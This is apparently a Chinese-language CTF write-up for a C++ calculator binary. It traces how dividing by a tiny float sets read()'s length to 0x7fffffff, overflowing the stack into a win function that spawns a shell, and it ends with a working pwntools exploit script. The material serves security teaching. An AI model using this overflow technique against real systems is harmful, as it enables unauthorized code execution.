---
title: C++
date: '2025-02-20 17:06:52'
updated: '2025-04-07 21:39:55'
---
# CPPCalc
是 C++程序，还没做过 C++的题目...C++也还没怎么看...尽力看看能不能做出来吧...

IDA 看了一下 strings 发现有 system 和 /bin/sh，函数表里面也有 system，应该是跟栈溢出有关系吧...

![](/images/6dd60c93b6ead61b84d4e1108db02d4d.png)

checksec 发现没有 canary 和 PIE

再一看发现有个 win 函数直接可以 getshell：

![](/images/5a2c34c82791ec359ddfd462aa32498e.png)

没学过 C++，不太懂，得仔细看看程序干了些什么

刚开始看见这个字节数组以 Calculator 类型指针传进 Calculator 函数初始化，估计 IDA 没办法识别出程序定义的 Calculator 类？

![](/images/0352a51e39140ceac9a0c22edf826382.png)

v3 一共 28 个字节，calculator 类型的对象里面有 7 个 DWORD 类型的数，对应索引 0-6

![](/images/3be8c3d37c879d29de86dc9ed8f11a62.png)

v3 被初始化为 0，

下面这个 setup 函数也是跟之前见到的不太一样：

![](/images/ae412a65fc897a8b4cf1794aac754cf0.png)

没有把标准输出设为无缓冲区，而是把 bss 段设为无缓冲区...（没看明白...）

接着看到 backdoor 函数：

```cpp
read(0, buf, *((int *)this + 6))
```

这里 read 函数读取的字节是从传入的 v3 的第七个 int 类型数据得到的，

又因为 backdoor 函数和后面的 floater、integer 函数是括在同一个 while 循环里面

所以可以利用后面的函数修改 v3 这个位置的值实现溢出

接着看 floater 函数：

![](/images/1faafb4c800ab2e63c00695692222614.png)

框起来的这个函数是检查 float 类型的数字是否包含小数部分，如果没有小数部分，或者小数部分位数很少（<=1），函数返回 1；否则返回 0。

再看看 integer 函数：

![](/images/5464c09a58927bf1458bef7631e5a85b.png)

floater 和 integer 这两个函数都要求两个输入在 0 到 10

但是可以看看 floater 里面能不能输入一个超级接近 0 的小数来当除数，这样被除数在 0 到 10 之间就可以除出来一个巨大的数放到`this + 6`里面给到 backdoor

接下来看看在哪里下断点

不看汇编不知道，一看吓一跳，原来涉及浮点运算的时候用到了 `xmm` 寄存器，之前还只是在资料里面看到说这个寄存器的残余值可以利用

汇编指令没几个认识的...

![](/images/04a1927d5d286eff351523a60a682a4e.png)

断在

```cpp
*((_DWORD *)this + 6) = (int)*((float *)this + 5);
```

看了看如果输入 10/0.000000001 这个时候传进去的值是 0x7fffffff，已经满足利用 read 函数溢出到返回地址了

exp：

```cpp
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

link=process("./Calc")

win=0x401745 # 注意栈平衡

link.recvuntil(b'>')
link.sendline(b'1')
link.recvuntil(b'>')
link.sendline(b'10')
link.recvuntil(b'>')
link.sendline(b'0.000000001')
link.recvuntil(b'>')
link.sendline(b'1337')

# gdb.attach(link)
# pause()

payload=b'a'*0x408+p64(win)
link.sendline(payload)

link.interactive()
```



